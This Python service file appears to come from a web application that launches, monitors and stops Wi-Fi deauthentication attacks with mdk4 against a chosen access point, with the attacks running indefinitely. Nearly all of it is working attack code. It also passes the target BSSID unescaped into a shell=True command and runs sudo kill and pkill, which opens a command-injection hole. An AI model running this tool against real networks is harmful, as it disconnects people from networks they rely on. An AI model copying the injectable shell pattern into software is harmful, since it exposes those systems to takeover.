# app/services/wifi_deauth_service.py

import os
import subprocess
import asyncio
from typing import AsyncGenerator

from app.helpers.network import enable_monitor, disable_monitor
from app.repositories.wifi_network_repository import WifiNetworkRepository


class WifiDeauthService:
    def __init__(self, db):
        self.repo = WifiNetworkRepository(db)
        self._running_attacks = {}

    async def start_deauth(self, bssid: str, channel: str, interface: str) -> str:
        """Start a deauthentication attack on the specified access point.
        The attack will run indefinitely until stop_deauth is called."""
        # Check if attack is already running for this BSSID
        if (
            bssid in self._running_attacks
            and self._running_attacks[bssid]["process"].poll() is None
        ):
            raise ValueError(f"Deauth attack already in progress for {bssid}")

        # Enable monitor mode
        enable_monitor(interface)

        # Start the deauth attack using mdk4
        process = subprocess.Popen(
            [
                "mdk4",
                interface,
                "d",
                "-c",
                channel,
                "-B",
                bssid,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Store information about the attack
        self._running_attacks[bssid] = {
            "process": process,
            "interface": interface,
            "start_time": asyncio.get_event_loop().time(),
            "completed": False,
        }

        await self.repo.update_status(bssid, "Deauth")

        return bssid

    async def stop_deauth(self, bssid: str) -> bool:
        """Stop a running deauth attack."""
        if bssid not in self._running_attacks:
            return False

        attack = self._running_attacks[bssid]
        process = attack["process"]
        interface = attack["interface"]

        try:
            # First try terminating gracefully
            if process.poll() is None:
                process.terminate()
                # Wait up to 2 seconds for the process to terminate
                try:
                    process.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    # Force kill if it's still running
                    process.kill()
                    process.wait()

            # Force kill any mdk4 processes using this BSSID that might still be running
            # This is a backup in case normal termination failed
            try:
                print(f"Stopping deauth attack for BSSID: {bssid}")

                # First try using our custom kill script with sudo
                kill_script = os.path.join(
                    os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
                    "kill_mdk4.sh",
                )
                subprocess.run(["sudo", kill_script, bssid], stderr=subprocess.DEVNULL)

                # Also try using regular kill methods in case the script fails
                find_cmd = (
                    f"ps -eo pid,command | grep -i 'mdk4.*-B {bssid}' | grep -v grep"
                )
                result = subprocess.run(
                    find_cmd, shell=True, stdout=subprocess.PIPE, text=True
                )

                # Extract PIDs from the output and kill them
                if result.stdout.strip():
                    for line in result.stdout.strip().split("\n"):
                        parts = line.strip().split()
                        if parts:
                            try:
                                pid = int(parts[0])
                                # Log the PID we're trying to kill
                                print(
                                    f"Found mdk4 process with PID {pid}, attempting to kill"
                                )

                                # Try using sudo kill directly
                                subprocess.run(
                                    ["sudo", "kill", "-9", str(pid)],
                                    stderr=subprocess.DEVNULL,
                                )
                            except (ValueError, IndexError):
                                pass

                # Make sure any mdk4 process using this interface is killed
                subprocess.run(
                    ["sudo", "pkill", "-9", "-f", f"mdk4.*{interface}"],
                    stderr=subprocess.DEVNULL,
                )
            except Exception as e:
                print(f"Error killing mdk4 processes: {e}")

            # Disable monitor mode
            disable_monitor(interface)

            await self.repo.update_status(bssid, "Main")
            attack["completed"] = True

            return True
        except Exception as e:
            print(f"Error stopping deauth attack: {e}")
            # Still try to disable monitor mode even if other operations failed
            try:
                disable_monitor(interface)
            except:
                pass
            return False

    async def events(self, bssid: str) -> AsyncGenerator[str, None]:
        """Generate SSE events for deauth attack progress."""
        if bssid not in self._running_attacks:
            yield 'event: error\ndata: {"message":"No deauth attack found"}\n\n'
            return

        attack = self._running_attacks[bssid]
        start_time = attack["start_time"]
        process = attack["process"]
        counter = 0

        # Initial event
        yield 'event: start\ndata: {"message":"Deauth attack started"}\n\n'

        # Monitor the attack progress - now runs until stopped or process dies
        try:
            while process.poll() is None:
                current_time = asyncio.get_event_loop().time()
                elapsed = int(current_time - start_time)
                counter += 1

                # Send a heartbeat to maintain connection and update elapsed time
                yield f'event: progress\ndata: {{"elapsed":{elapsed},"heartbeat":{counter}}}\n\n'

                await asyncio.sleep(1)

            # If we get here, the process ended on its own
            yield 'event: done\ndata: {"message":"Deauth attack process ended unexpectedly"}\n\n'

        finally:
            # Ensure we clean up if there's an exception
            if process.poll() is None:
                await self.stop_deauth(bssid)
